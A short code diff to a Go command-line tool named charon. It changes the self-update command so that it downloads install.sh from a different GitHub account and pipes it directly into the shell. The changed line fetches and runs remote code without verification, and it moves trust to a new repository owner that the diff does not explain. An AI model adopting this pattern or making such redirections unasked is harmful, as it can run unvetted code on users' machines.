@@ -504,7 +504,7 @@ func cmdUninstall() error {
 // cmdUpdate runs the online install.sh script to upgrade the binary.
 func cmdUpdate() error {
 	fmt.Println("Checking for updates and upgrading charon ...")
-	cmd := exec.Command("sh", "-c", "curl -fsSL https://github.com/mingtheanlay/charon/releases/latest/download/install.sh | sh")
+	cmd := exec.Command("sh", "-c", "curl -fsSL https://github.com/Administration-626/charon/releases/latest/download/install.sh | sh")
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	if err := cmd.Run(); err != nil {
